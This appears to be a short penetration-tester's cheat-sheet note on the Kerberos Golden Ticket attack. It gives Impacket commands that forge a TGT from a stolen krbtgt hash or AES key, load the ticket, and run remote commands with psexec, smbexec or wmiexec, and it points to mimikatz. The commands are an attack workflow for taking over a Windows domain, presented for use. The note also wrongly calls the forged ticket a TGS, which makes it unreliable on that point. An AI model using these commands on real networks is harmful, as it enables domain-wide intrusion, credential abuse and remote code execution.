**When we have the hash for TGS from Kerberos that means we can access any machine in the domain and we can abuse that using mimikatz**

# Requirements:
1. Domain SID
![[Pasted image 20221229190901.png]]

2. ntlm or nt  hash for krbtgt 


# Impackets

```bash

# To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

# mimikatz

![[Mimikatz#*Golden Ticket*]]

---
Tags: #mimikatz #golden_ticket #kerberos #impackets 
Resources: [kerberos_cheat_sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)